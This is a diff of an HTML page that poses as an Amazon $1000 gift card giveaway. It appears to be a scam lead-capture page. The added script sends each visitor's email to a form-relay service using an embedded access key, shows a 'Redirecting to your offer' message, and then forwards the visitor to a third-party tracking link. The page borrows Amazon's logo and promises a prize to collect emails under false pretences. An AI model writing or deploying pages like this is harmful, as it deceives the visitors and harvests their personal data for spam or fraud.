@@ -3,84 +3,95 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Amazon Gift Card Giveaway</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
+  <title>Win a $1000 Amazon Gift Card</title>
   <style>
     body {
-      background-color: #eaf6f7;
-      font-family: 'Poppins', sans-serif;
       margin: 0;
-      padding: 0;
-      text-align: center;
+      font-family: Arial, sans-serif;
+      background: #e9f6f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
     }
-    .topbar {
-      background-color: #002742;
-      color: white;
-      font-size: 20px;
-      padding: 14px 0;
-      font-weight: 600;
-    }
-    .container {
-      background-color: white;
-      max-width: 400px;
-      margin: 40px auto;
+    .box {
+      background: white;
       padding: 30px 20px;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
     }
-    h1 {
-      color: #d88e00;
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 15px;
-      color: #333;
-      margin-bottom: 20px;
-    }
-    .gift-img {
+    .box img {
       width: 100%;
       border-radius: 8px;
-      margin-bottom: 20px;
     }
-    input[type="email"] {
+    .box input, .box button {
       width: 100%;
       padding: 14px;
-      font-size: 15px;
-      border-radius: 8px;
+      margin-top: 10px;
+      border-radius: 6px;
       border: 1px solid #ccc;
-      margin-bottom: 14px;
-    }
-    button {
-      background-color: #e7a308;
-      color: white;
       font-size: 16px;
-      font-weight: 600;
-      padding: 14px;
-      width: 100%;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
     }
-    button:hover {
-      background-color: #cc9200;
+    .box button {
+      background: #e48c00;
+      color: white;
+      font-weight: bold;
+      border: none;
+    }
+    .thankyou {
+      display: none;
+      text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <div class="topbar">Limited-Time Giveaway</div>
-
-  <div class="container">
-    <h1>Win a $1000 Amazon Gift Card!</h1>
+  <div class="box" id="formBox">
+    <h2>Win a $1000 Amazon Gift Card!</h2>
     <p>Enter your email below and claim your chance. This offer won't last long!</p>
-    <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" class="gift-img" alt="Amazon Gift Card"/>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
     
-    <form action="thankyou.html" method="GET">
+    <form id="leadForm">
       <input type="email" name="email" placeholder="Enter your email" required />
+      <input type="hidden" name="access_key" value="0dcca38e-523a-4c4a-9f0c-1488002d5763" />
       <button type="submit">Claim Now</button>
     </form>
   </div>
+
+  <div class="thankyou" id="thankYouBox">
+    <h2>Thank you!</h2>
+    <p>Redirecting to your offer...</p>
+  </div>
+
+  <script>
+    document.getElementById("leadForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      const form = e.target;
+
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          access_key: form.access_key.value,
+          email: form.email.value
+        })
+      }).then(response => {
+        if (response.ok) {
+          document.getElementById("formBox").style.display = "none";
+          document.getElementById("thankYouBox").style.display = "block";
+          setTimeout(() => {
+            window.location.href = "https://singingfiles.com/show.php?l=0&u=178843&id=68652";
+          }, 3000);
+        } else {
+          alert("There was an error, please try again.");
+        }
+      });
+    });
+  </script>
 
 </body>
 </html>
